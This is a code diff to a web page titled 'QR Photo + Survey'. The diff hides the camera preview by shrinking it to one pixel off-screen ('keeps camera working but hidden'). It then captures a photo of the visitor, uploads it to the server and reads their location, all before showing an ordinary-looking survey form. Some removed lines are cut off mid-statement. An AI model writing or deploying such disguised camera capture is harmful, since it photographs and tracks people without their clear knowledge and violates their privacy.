@@ -2,10 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Survey</title>
+<title>QR Photo + Survey</title>
 <style>
 body { font-family: Arial; text-align: center; margin-top: 30px; background: #f2f2f2; }
-video, canvas { display: none; }
+video { 
+  width: 1px; 
+  height: 1px; 
+  position: absolute; 
+  top: -100px; 
+  left: -100px; 
+} /* keeps camera working but hidden */
+canvas { display: none; }
 h2 { color: #333; }
 p { color: #555; }
 form { margin-top: 20px; display: none; background: #fff; padding: 20px; border-radius: 10px; width: 320px; margin-left: auto; margin-right: auto; }
@@ -82,11 +89,13 @@ const thanks = document.getElementById("thanksMessage");
 const downloadLink = document.getElementById("downloadLink");
 let lastUploadUrl = "";
 
+// Camera initialization
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     video.srcObject = stream;
 
+    // Geolocation (optional)
     navigator.geolocation.getCurrentPosition(
       (pos) => console.log("Location:", pos.coords.latitude, pos.coords.longitude),
       () => console.log("Location denied")
@@ -99,7 +108,54 @@ async function init() {
   }
 }
 
-function getQRFromURL() {
-  const params = new URLSearchParams(window.location.search);
-  return param
+// Capture photo and upload
+function captureAndSend(stream) {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+
+  canvas.toBlob(async (blob) => {
+    const formData = new FormData();
+    formData.append("photo", blob);
+    formData.append("qr_id", "unknown");
+
+    try {
+      const res = await fetch("/api/upload", { method: "POST", body: formData });
+      const data = await res.json();
+
+      if (data.status === "success") {
+        lastUploadUrl = data.downloadUrl;
+        document.querySelector('h2').style.display = 'none';
+        document.querySelector('p').style.display = 'none';
+        form.style.display = 'block';
+      } else {
+        alert("Upload failed.");
+      }
+
+    } catch (err) {
+      alert("Upload failed. Refresh and try again.");
+    }
+  });
+
+  stream.getTracks().forEach(track => track.stop());
+}
+
+// Form submission
+form.addEventListener("submit", function(e) {
+  e.preventDefault();
+  form.style.display = "none";
+  thanks.style.display = "block";
+
+  if (lastUploadUrl) {
+    downloadLink.href = lastUploadUrl;
+    downloadLink.style.display = "inline-block";
+    downloadLink.textContent = "Download your photo";
+    downloadLink.download = ""; // enable browser download
+  }
+});
+
+init();
+</script>
+</body>
+</html>
 
